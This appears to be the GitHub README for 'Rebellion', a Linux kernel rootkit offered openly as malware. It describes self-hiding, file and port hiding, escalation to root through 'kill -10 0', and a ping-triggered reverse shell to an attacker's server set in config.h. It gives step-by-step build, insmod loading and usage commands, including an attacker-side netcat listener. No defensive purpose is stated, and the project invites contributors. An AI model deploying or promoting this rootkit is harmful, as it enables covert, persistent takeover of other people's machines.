<h1 align="center">「⚔️」 About Rebellion</h1>

<p align="center"><img src="assets/banner.png"></p>

Rebellion is a sophisticated rootkit malware developed specifically for operating systems based on the Linux kernel in the x86 and x86_64 architecture in its 5.x/6.x versions. Rebellion has several features such as self hide/unhide, hide folder/file, hide TCP/UDP port, turning low-privilege users into root and backdoor via ping.

**Note**: Currently, the rootkit is going through a beta phase, where bugs, compilation failures, problems with architectures can be found. I ask that you collaborate with the development of the project to avoid as many problems as possible.

## Features
### Self hide/unhide
Rebellion has the ability to hide/unhide in the system using the `kill -12 0` command.

### Hide folder/file
Rebellion allows you to hide files and directories from a magic prefix defined as `reb_` (`config.h`).
Ex.: `reb_operations/`, `reb_backdoor.elf`.

### Hide TCP/UDP port
Rebellion allows you to hide a TCP/UDP port on your system. The port is defined in the `config.h` file in the `HIDE_PORT` macro.
**Note**: Only works for `netstat` and `lsof` commands. This is a part that is still under development.

### User2Root
When running the `kill -10 0` command with a low-privilege user, Rebellion adds their privileges to `0`, making them a user with `root` permissions on the system.

### Backdoor via ping
Rebellion has a feature that allows you to receive a reverse shell via `netcat` (it is important that it is installed) by sending an ICMP packet via `ping` to your IP and port defined in the `config.h` file in the macros `YOUR_SRV_IP` and `YOUR_SRV_PORT`.

* Self hide/unhide
* Hide folder/file
* Hide TCP/UDP port
* User2Root
* Backdoor via ping

## Tested Kernel Versions
| Distro | Kernel Details |
| ----------- | ----------- |
| Debian GNU/Linux 12 (bookworm) | 6.1.0-32-amd64 (2025-03-06) x86_64 GNU/Linux |
| Ubuntu 22.04 (Jammy Jellyfish) | 5.15.0-25-generic Mar 30 15:54:22 UTC 2022 x86_64 GNU/Linux |

## Build & Run
```
git clone https://github.com/brosck/Rebellion
cd Rebellion/src
# edit config.h file
make
sudo insmod rebellion.ko
```

## Usage
### Self hide/unhide
```
kill -12 0
```

### Hide folder/file
```
mkdir reb_operations
cd reb_operations
echo test > reb_test.txt
```

### Hide TCP/UDP port
```
# edit HIDE_PORT macro in config.h
netstat -tunlp | grep 1234
```

### User2Root
```
kill -10 0
```

### Backdoor via ping
Target machine:
```
# edit YOUR_SRV_IP and YOUR_SRV_PORT macro in config.h and start LKM
```

Your machine (1º terminal):
```
nc -lnvp 1234
```

Your machine (2º terminal):
```
sudo ping -c 1 <TARGET IP>
```

## Bugs and Improvements
If you have any suggestions for improvements or want to report a bug, feel free to create and report an [issue](https://github.com/brosck/Rebellion/issues) or [pull request](https://github.com/brosck/Rebellion/issues), the aim is always to improve the tool with different features.
